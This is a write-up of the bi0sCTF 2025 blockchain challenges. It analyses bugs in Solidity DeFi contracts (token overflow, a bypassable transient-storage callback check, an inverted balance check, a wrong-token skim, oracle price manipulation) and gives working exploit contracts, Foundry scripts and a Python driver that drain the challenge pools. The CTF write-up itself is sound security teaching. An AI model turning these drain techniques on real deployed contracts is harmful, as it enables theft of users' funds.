@@ -1,0 +1,609 @@
+---
+title: bi0sCTF 2025 – Blockchain Challenges
+date: '2025-06-14'
+draft: false
+authors: ['snwo']
+tags: ['Blockchain', 'bi0sCTF 2025', 'Web3', 'Solidity']
+summary: 'Writeup for all blockchain challenges in bi0sCTF 2025.'
+---
+
+I participated in bi0sCTF last weekend as part of Project Sekai, and solved all blockchain challenges with my teammate [Y4nhu1](https://sekai.team/members/yanhu). Overall, the quality of DeFi-related challenges was good, though there were some unintended solutions and minor bugs within the codebase. 
+
+## Empty Vessel
+
+### Setup
+
+- The user starts with `1746230400` INR.
+- `stakeINR` should be called before setup contract redeem all shares.
+
+### Goal
+
+The received assets should be less than or equal to `75_000e18`.
+
+## Analysis
+
+```js
+function deposit(uint256 assets, address receiver) external returns (uint256) {
+    if (assets > maxDeposit(msg.sender)) {
+        revert Stake_Assets_Exceeds_Max_Deposit_Limit();
+    }
+    uint256 shares = convertToShares(assets);
+    if (shares == 0) {
+        revert Stake_Zero_Shares();
+    }
+}
+// [...]
+```
+
+The `Stake` contract is a simple `ERC4626` vault with a zero-share check. We can make the `setup` contract redeem just `75_000e18` INR with the first 1 wei deposit and by sending `50_000e18` INR to the Stake contract. However, it only gives `1746230400` INR.
+
+### The bug
+
+```js
+function batchTransfer(address[] memory receivers, uint256 amount) public returns (bool) {
+    // [...]
+    if lt(mload(ptr), mul(mload(receivers), amount)) { // amount < receivers * amount
+        mstore(add(ptr,0x20),0xcf479181)
+        mstore(add(ptr,0x40),mload(ptr))
+        mstore(add(ptr,0x60),mul(mload(receivers),amount))
+        revert(add(add(ptr,0x20),0x1c),0x44)
+    }
+    
+    for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)} {
+        mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))
+        mstore(add(ptr,0x20),1)
+        sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))
+    }
+}
+```
+
+The bug was in the `INR` token contract. There is an integer overflow in the amount check, so by sending `(1<<256)/2` to the user and another address, we can inflate the INR balance.
+
+### Exploit
+
+1. Claim INR.
+2. Call `batchTransfer` to send `(1<<256)/2` to the user.
+3. Deposit 1 wei and send `50_000e18` INR to the Stake contract.
+
+```js
+contract Solve is Script{
+    function run() public {
+        vm.startBroadcast();
+        Setup setup = Setup(vm.envAddress("SETUP"));
+        Stake stake = setup.stake();
+        INR inr = setup.inr();
+        setup.claim();
+        inr.approve(address(stake), type(uint256).max);
+        address[] memory receivers = new address[](2);
+        receivers[0] = msg.sender;
+        receivers[1] = address(0);
+        inr.batchTransfer(receivers, 0x8000000000000000000000000000000000000000000000000000000000000000);
+        stake.deposit(1, msg.sender);
+        inr.transfer(address(stake), 50_000 ether);
+        setup.stakeINR();
+        setup.solve();
+        vm.stopBroadcast();
+    }
+}
+```
+
+## Transient Heist
+
+### Setup
+
+- Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools.
+- The user starts with `80_001e18` WETH.
+
+### Goal
+
+Make collateral deposited over hash amount
+
+```js
+function isSolved() public view returns (bool) {
+    bytes32 FLAG_HASH = keccak256("YOU NEED SOME BUCKS TO GET FLAG");
+    bool check1;
+    bool check2;
+    if (usdsEngine.collateralDeposited(player,usdsEngine.collateralTokens(0)) > uint256(FLAG_HASH)) {
+        check1 = true;
+    }
+    if (usdsEngine.collateralDeposited(player,usdsEngine.collateralTokens(1)) > uint256(FLAG_HASH)) {
+        check2 = true;
+    }
+    return (check1 && check2);
+}
+```
+
+### Analysis
+
+The `USDSEngine` contract provides functionality to mint and burn the `USDS` token based on the collateral deposited. Let’s look at the `depositCollateralThroughSwap` and `bi0sSwapv1Call` functions. The contract stores the address of the `bi0sSwapPair` in transient storage slot 1. After the swap, it updates this slot with the amount of tokens sent back. The `bi0sSwapv1Call` function is called by the `bi0sSwapPair` contract after a swap. It checks if the sender matches the address stored in slot 1 and then increases the collateral deposited by the `collateralDepositAmount`.
+
+If we can set `tokensSentBack` to the user’s address, we can increase the collateral amount arbitrarily. The `acceptedToken` modifier only checks `_otherToken`, not `_collateralToken`. This allows us to create a fake token pair that can manipulate `amountOut` to the user’s address and set any desired collateral deposit amount.
+
+```js
+function depositCollateralThroughSwap(address _otherToken, address _collateralToken, uint256 swapAmount, uint256 _collateralDepositAmount) public acceptedToken(_otherToken) returns (uint256 tokensSentBack) {
+    IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount);
+    IBi0sSwapPair bi0sSwapPair = IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken));
+    assembly{
+        tstore(1,bi0sSwapPair)
+    }
+    bytes memory data = abi.encode(_collateralDepositAmount);
+    bi0sSwapPair.swap(_otherToken, swapAmount, address(this), data);
+    assembly{
+        tokensSentBack:=tload(1)
+    }
+}
+
+function bi0sSwapv1Call(address sender, address collateralToken, uint256 amountOut, bytes memory data) external nonReEntrant {
+    uint256 collateralDepositAmount = abi.decode(data,(uint256));
+    address bi0sSwapPair;
+    assembly{
+        bi0sSwapPair:=tload(1)
+    }
+    if (msg.sender != bi0sSwapPair) {
+        revert USDSEngine__Only__bi0sSwapPair__Can__Call();
+    }
+    if (collateralDepositAmount<amountOut) {
+        revert USDSEngine__Insufficient__Collateral();
+    }
+    uint256 tokensSentBack = amountOut-collateralDepositAmount;
+    assembly{
+        tstore(1,tokensSentBack)
+    }
+    collateralDeposited[sender][collateralToken] += collateralDepositAmount;
+}
+```
+
+### Exploit
+
+```js
+contract Exploiter {
+    Setup setup;
+    IBi0sSwapFactory factory;
+
+    WETH weth;
+    USDC usdc;
+    SafeMoon safeMoon;
+
+    address wethSafeMoonPair;
+    address wethUsdcPair;
+    address safeMoonUsdcPair;
+
+    USDSEngine usdsEngine;
+
+    constructor(Setup _setup) payable {
+        setup = _setup;
+        factory = _setup.bi0sSwapFactory();
+        weth = _setup.weth();
+        usdc = _setup.usdc();
+        safeMoon = _setup.safeMoon();
+        wethSafeMoonPair = address(_setup.wethSafeMoonPair());
+        wethUsdcPair = address(_setup.wethUsdcPair());
+        safeMoonUsdcPair = address(_setup.safeMoonUsdcPair());
+        usdsEngine = _setup.usdsEngine();
+
+        _setup.setPlayer(address(this));
+    }
+
+    function exploit() external {
+        USDC fake = new USDC(type(uint).max);
+        address fakePair = factory.createPair(address(fake), address(weth));
+        uint addressAmount = uint160(address(this));
+        fake.transfer(fakePair, addressAmount * 2);
+        weth.deposit{value: 2}(address(this));
+        weth.transfer(fakePair, 1);
+        IBi0sSwapPair(fakePair).addLiquidity(address(this));
+
+        weth.approve(address(usdsEngine), 1);
+        usdsEngine.depositCollateralThroughSwap(address(weth), address(fake), 1, 0);
+
+        uint256 FLAG_HASH = uint256(keccak256("YOU NEED SOME BUCKS TO GET FLAG"));
+        usdsEngine.bi0sSwapv1Call(address(this), address(weth), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
+        usdsEngine.bi0sSwapv1Call(address(this), address(safeMoon), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH));
+    }
+}
+
+contract Solve is Script{
+    function run() public {
+        vm.startBroadcast();
+        Setup setup = Setup(vm.envAddress("SETUP"));
+        Exploiter exploiter = new Exploiter{value: 80_000 ether}(setup);
+        exploiter.exploit();
+        vm.stopBroadcast();
+    }
+}
+```
+
+## Transient Heist Revenge
+
+### Setup
+
+- Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools.
+- The user starts with `80_001e18` WETH.
+
+### Goal
+
+Make the collateral deposited exceed the hash amount.
+
+### Revenge Idea
+
+The `acceptedToken` modifier only checks the `collateralToken`. With 80,000 WETH, we can obtain a significant amount of SafeMoon tokens. If we can create a contract address with seven leading zeros, we can set `tokensSentBack` to match the user’s address. After swap, we can send `amount - (contract address)` to the user vault to set `amountOut` to the user’s address. Then, by directly calling `bi0sSwapv1Call`, we can set an arbitrary collateral deposit amount.
+
+The exploit requires a vanity contract address, not EOA because we should use transient storage.
+
+`cast create2 --starts-with "0000000" --init-code-hash "~~" --deployer "~~"`
+
+```js
+function bi0sSwapv1Call(address sender, address collateralToken, uint256 amountOut, bytes memory data) external nonReEntrant {
+    uint256 collateralDepositAmount=abi.decode(data,(uint256));
+    address bi0sSwapPair;
+    assembly{
+        bi0sSwapPair:=tload(1)
+    }
+    if (msg.sender!=bi0sSwapPair) {
+        revert USDSEngine__Only__bi0sSwapPair__Can__Call();
+    }
+    if (collateralDepositAmount>amountOut) {
+        revert USDSEngine__Insufficient__Collateral();
+    }
+    uint256 tokensSentToUserVault = amountOut-collateralDepositAmount;
+    user_vault[sender][collateralToken] += tokensSentToUserVault;
+    assembly{
+        tstore(1,tokensSentToUserVault)
+    }
+    collateralDeposited[sender][collateralToken] += collateralDepositAmount;
+}
+```
+
+## Vastavikamania token
+
+### Setup
+
+- Deploy three VSTETH token pairs and send some WETH to the balancer contract.
+
+### Goal
+
+Earn over 141.3 ether.
+
+### Analysis
+
+There were two unintended solutions. The first one is setting the player address to the WETH contract address.
+
+```js
+function setPlayer(address _player) public {
+    player = _player;
+}
+
+function isSolved() public view returns (bool) {
+    if (player.balance < 141.3 ether) {
+        return false;
+    }
+    return true;
+}
+```
+
+Another bug is in the `takeOffLiquidity` function. It incorrectly permits users to withdraw more than their available balance.
+
+```js
+function takeOffLiquidity(address _token, uint256 _amount) external nonReentrant {
+    uint256 user_balance = tokenBalances[_token][msg.sender];
+    if (_amount<user_balance) { // @audit-info should use `>`
+        revert Balancer__Insufficient__User__Balance(_amount, user_balance);
+    }
+    IERC20(_token).transfer(msg.sender, _amount);
+}
+```
+
+The intended solution was to borrow all WETH from the balancer and execute a sequence of `buyQuote` -> `addVasthavikamainaLiquidity` -> `sellQuote` functions to generate profit across three pools. After swapping all borrowed WETH for lamboToken, we can add liquidity to a pool with an increased lamboToken price. By providing half of the tokens as liquidity, we can generate additional profit through the increased `K` value in the pair.
+
+```js
+function addVasthavikamainaLiquidity(address _vasthavikamainaToken, address _lamboToken, uint256 _loanAmount, uint256 _quoteAmount) external returns(uint256) {
+    if (!_whiteList[_vasthavikamainaToken]) {
+        revert Factory__VasthavikamainaToken__Not_WhiteListed(_vasthavikamainaToken);
+    }
+    address _uniPair = __calculatePoolAddress(_vasthavikamainaToken, _lamboToken);
+    (address _token0,) = __getToken0andToken1(_vasthavikamainaToken, _lamboToken);
+    (uint112 _reserve0, uint112 _reserve1,) = IUniswapV2Pair(_uniPair).getReserves();
+    uint256 _lamboTokens_To_Transfer;
+    if (_token0 == _vasthavikamainaToken) {
+        _lamboTokens_To_Transfer = (_loanAmount*_reserve1)/_reserve0;
+    } else {
+        _lamboTokens_To_Transfer = (_loanAmount*_reserve0)/_reserve1;
+    }
+    VasthavikamainaToken(_vasthavikamainaToken).takeLoan(_uniPair, _loanAmount);
+    LamboToken(_lamboToken).transferFrom(msg.sender, _uniPair, _lamboTokens_To_Transfer);
+    IUniswapV2Pair(_uniPair).mint(address(1));
+
+    emit Factory__LiquidityAdded(_vasthavikamainaToken, _lamboToken,_loanAmount, _lamboTokens_To_Transfer);
+    return _lamboTokens_To_Transfer;
+}
+```
+
+## The Time Travellers DEX
+
+### Setup
+
+- The Finance contract has 250,000 ether, 500,000 WETH, and 11,500,000,000 INR.
+- The DEX contract has an LP with 50,000 WETH and 230,000 INR.
+
+### Goal
+
+`dex` contract should maintain initial supply, but user should extract over 100_000 WETH, `230000 * 100000` INR and 89835 ether with 6 swaps.
+
+```js
+function solve() external{
+    address _msgSender=msg.sender;
+    if (IERC20(WETH).balanceOf(_msgSender) < 100_000 ether) {
+        revert Setup_Insufficient_WETH_To_Solve();
+    } else if (IERC20(INR).balanceOf(_msgSender) < 2_30_000 * 100_000 ether ) {
+        revert Setup_Insufficient_INR_To_Solve();
+    } else if (_msgSender.balance < 89_835 ether) {
+        revert Setup_Insufficient_ETH_To_Solve();
+    } else if (dex.reserve0() < WETH_SUPPLIED_BY_LP || dex.reserve1() < INR_SUPPLIED_BY_LP) {
+        revert Setup_Dex_Pool_Ratio_Changed();
+    } else if (dex.swaps_count() > uint256(6)) {
+        revert Setup_DEX_Swap_Count_Limit_Exceeds();
+    }
+    solved=true;
+}
+```
+
+### Analysis
+
+The finance contract provides functions, stake, withdraw, flashLoan:
+
+```js
+function stake(address _tokenOut) external payable approvedChecker(_tokenOut) returns (uint256) {
+    if (msg.value < MIN_STAKE) {
+        revert FINANCE_Invalid_Stake_Amount(msg.value, MIN_STAKE);
+    }
+    if (_tokenOut == address(WETH)) {
+        Currency(_tokenOut).transfer(msg.sender, msg.value);
+        LatestBalances[address(WETH)] -= msg.value;
+        return msg.value;
+    } else {
+        (uint256 _wethPriceInInr,) = this.getPrice();
+        uint256 _tokensToMinted = (msg.value*_wethPriceInInr)/( 2**112);
+        Currency(_tokenOut).transfer(msg.sender, _tokensToMinted);
+        LatestBalances[address(INR)] -= _tokensToMinted;
+        return _tokensToMinted;
+    }
+}
+```
+
+We can stake over 0.5 ether to get WETH or INR. The amount of INR is determined by `getPrice` function. 
+
+```js
+function withdraw(address _token, uint256 _amount) external nonReentrant approvedChecker(_token) {
+    uint256 _tokensReceived = Currency(_token).balanceOf(address(this))-feesCollected[_token]-LatestBalances[_token];
+    
+    if (_tokensReceived < _amount) {
+        revert FINANCE_Expected_Amount_Not_Transferred(_amount, _tokensReceived);
+    }
+    LatestBalances[_token] += _tokensReceived;
+    if (_token == address(WETH)) {
+        (bool success,) = payable(msg.sender).call{value: _tokensReceived}("");
+        if (!success) {
+            revert FINANCE_Withdraw_Failed();
+        }
+    } else {
+        (uint256 _WethPriceInInr, uint256 _InrPriceInWeth) = this.getPrice();
+        uint256 _Eth_To_Transfer = ((_InrPriceInWeth* _tokensReceived )/(2**112))+1; //rounding up 
+        (bool success,) = payable(msg.sender).call{value: _Eth_To_Transfer}(""); 
+        if (!success) {
+            revert FINANCE_Withdraw_Failed();
+        }
+    }   
+}
+```
+
+The withdraw functions is similar. By sending WETH or INR token, we can get back ether, the price is determined by `getPrice` function when withdrawing INR.
+
+```js
+function timeElapsed() public view returns (uint256 _time) {
+    _time = block.timestamp-lastSnapshotTime;
+}
+
+function snapshot() public{
+    (uint256 _price0, uint256 _price1, uint256 _lastTimeStamp) = dex.get_Cumulative_Prices();
+    uint256 time_Elapsed = timeElapsed();
+    if (time_Elapsed < 1 minutes) {
+        revert FINANCE_Price_Is_Not_Yet_Expired();
+    }
+    wethPriceCumulative = _price0;
+    inrPriceCumulative = _price1;
+    lastSnapshotTime = _lastTimeStamp;
+}
+
+function getPrice() public view returns (uint256 _wethPrice, uint256 _inrPrice) {
+    uint256 time_Elapsed = timeElapsed();
+    if (lastSnapshotTime == 0) {
+        revert FINANCE_SnapShot_Not_Yet_Taken();
+    }
+    if (time_Elapsed >= 2 minutes) {
+        revert FINANCE_Price_Is_Expired();
+    }
+    
+    (uint256 _price0, uint256 _price1,) = dex.get_Cumulative_Prices();
+    
+    uint256 _timeElapsed = dex.timeStampLast()-lastSnapshotTime;
+    
+    if (_timeElapsed == 0) {
+        revert FINANCE_Prices_Not_Update_Since_Last_SnapShot();
+    }
+    _wethPrice = (_price0-wethPriceCumulative)/_timeElapsed;
+    _inrPrice = (_price1-inrPriceCumulative)/_timeElapsed; 
+}
+```
+
+To get price with `getPrice` function, the `snapshot` should be called at intervals between one and two minutes. 
+
+```js
+function _update() private {
+    reserve0 = uint112(IERC20(token0).balanceOf(address(this)));
+    reserve1 = uint112(IERC20(token1).balanceOf(address(this)));
+    uint256 timeElapsed = block.timestamp-timeStampLast;
+
+    if (timeElapsed > 0 && reserve0 > 0 && reserve1 > 0) {
+        price0CumulativeLast += uint256(UQ112x112.encode(reserve1).uqdiv(reserve0)*timeElapsed);
+        price1CumulativeLast += uint256(UQ112x112.encode(reserve0).uqdiv(reserve1)*timeElapsed);
+    }
+    timeStampLast = block.timestamp;
+}
+```
+
+In Dex contract, the price is calculated with current reserves of the tokens, similar to uniswap v2.
+
+### The bug
+
+```js
+function skim(address _to) external  {
+    IERC20(token0).transfer(_to, IERC20(token0).balanceOf(address(this))-reserve0);
+    IERC20(token0).transfer(_to, IERC20(token1).balanceOf(address(this))-reserve1);
+}
+```
+
+The vulnerability is on `skim` function, It transfers `token0` with `token1` diff, not `token1`. The initial price is set to `1WETH = 230000INR` buts the user can swap 1 INR to 1 WETH. 
+
+Well, this is unintended bug. The fundamental bug is that `getPrice` function does not reflect the price after swap without manual `snapshot` call.
+
+### Drain the contract
+
+Now we can drain all WETH in DEX contarct. But we should get some balances first:
+
+```js
+function claimBonus1() external{
+    if (claimed1) {
+        revert Setup_Bonus_Already_Claimed();
+    }
+    claimed1 = true;
+    payable(msg.sender).call{value: userBonus1}(""); // 12500 ether
+}
+
+function claimBonus2() external {
+    if (claimed2) {
+        revert Setup_Bonus_Already_Claimed();
+    }
+    if (finance.entered()) {
+        revert Setup_Bonus_Cannot_Be_Claimed_During_Flash_Loan();
+    }
+    if (IERC20(WETH).balanceOf(msg.sender) < 50_000 ether) {
+        revert Setup_Inelgible_For_Bonus_Claim();
+    }
+    claimed2 = true;
+    payable(msg.sender).call{value: userBonus2}(""); // 10000 ether
+}
+```
+
+In Setup contract, it provides 12500 ether first and then when we have over 50000 WETH, it sends additional 10000 ether.
+
+### Exploit
+
+1. Claim the initial WETH bonus and stake all received WETH to convert it to INR.
+2. Withdraw all WETH from the DEX at a 1:1 INR:WETH ratio.
+3. Claim the second Ether bonus after reaching the required WETH balance.
+4. Transfer 1 WETH to the DEX to manipulate the swap rate.
+5. Swap 1e18 WETH for INR at the manipulated rate, then withdraw most of the INR from the DEX.
+6. Send the same amount of INR back to the DEX and transfer 10,000e18 WETH to set the swap rate to 1:10,000.
+7. With the manipulated swap rate, withdraw all WETH from the finance contract using some INR, and then withdraw WETH from the DEX again to further increase the WETH price.
+8. Withdraw all INR from the finance contract at the manipulated rate, then send INR and WETH to the DEX to restore the initial LP amounts.
+
+```js
+contract Exploit {
+    Setup setup;
+    DEX dex;
+    Finance finance;
+    address WETH;
+    address INR;
+
+    receive() external payable {}
+    constructor(Setup _setup) {
+        setup = _setup;
+        dex = setup.dex();
+        finance = setup.finance();
+        WETH = setup.WETH();
+        INR = setup.INR();
+    }
+    function stage1() external {
+        setup.claimBonus1();
+        finance.snapshot();
+        dex.sync();
+        finance.stake{value: address(this).balance}(WETH);
+        
+        // 1. withdraw all WETH from dex
+        uint256 amount = IERC20(WETH).balanceOf(address(this));
+        IERC20(WETH).transfer(address(dex), amount);
+        dex.swap(WETH, amount, 0, address(this));
+        IERC20(INR).transfer(address(dex), IERC20(WETH).balanceOf(address(dex)));
+        dex.skim(address(this));
+        
+        // 2. claim bonus2
+        setup.claimBonus2();
+        IERC20(WETH).transfer(address(dex), 1);
+        finance.snapshot();
+        dex.sync();
+    }
+
+    function stage2() external {
+        // 3. set swap rate 10000:1
+        IERC20(WETH).transfer(address(dex), 1e18);
+        dex.swap(WETH, 1, 0, address(this));
+        uint256 gap = IERC20(WETH).balanceOf(address(dex)) - IERC20(INR).balanceOf(address(dex));
+        IERC20(INR).transfer(address(dex), gap);
+        IERC20(WETH).transfer(address(dex), 10000e18);
+        dex.sync();
+    }
+
+    function stage3() external {
+        // 4. withdraw ETH from finance
+        finance.snapshot();
+        dex.sync();
+        IERC20(INR).transfer(address(finance), 262473*1e14);
+        finance.withdraw(INR, 0);
+
+        IERC20(INR).transfer(address(dex), 10000e18 + (1 ether - 1e11));
+        dex.skim(address(this));
+        finance.snapshot();
+    }
+
+    function stage4() external {
+        // 5. withdraw INR from finance
+        dex.sync();
+        finance.stake{value: 1.1 ether}(INR);
+        IERC20(WETH).transfer(address(dex), setup.WETH_SUPPLIED_BY_LP());
+        IERC20(INR).transfer(address(dex), setup.INR_SUPPLIED_BY_LP());
+        dex.sync();
+        finance.stake{value: 100_000 ether - IERC20(WETH).balanceOf(address(this))}(WETH);
+        setup.solve();
+    }
+}
+```
+
+```python
+## [...]
+setup_addr = "0x33f2D286C37bA672562cA96A97e9047C93a10002"
+pv_key = "0x9f177531d167891c3ade8a6b754393750350f941da78feaaeecf1d678dd14891"
+rpc_url = "http://rpc.eng.run:8372"
+env=os.environ.copy()
+env.update({
+    "SETUP": setup_addr
+})
+
+out, err = create(setup_addr, pv_key, rpc_url, env)
+exploit_addr = out.split("Deployed to: ")[1].split("\n")[0]
+print(f"Exploit contract deployed to {exploit_addr}")
+time.sleep(60);
+print("Stage 1")
+out, err = cast_send(exploit_addr, "stage1()", pv_key, rpc_url, env)
+time.sleep(5)
+print("Stage 2")
+out, err = cast_send(exploit_addr, "stage2()", pv_key, rpc_url, env)
+time.sleep(60)
+print("Stage 3")
+out, err = cast_send(exploit_addr, "stage3()", pv_key, rpc_url, env)
+time.sleep(5)
+print("Stage 4")
+out, err = cast_send(exploit_addr, "stage4()", pv_key, rpc_url, env)
+## [...]
+```
+
+Thanks for reading!
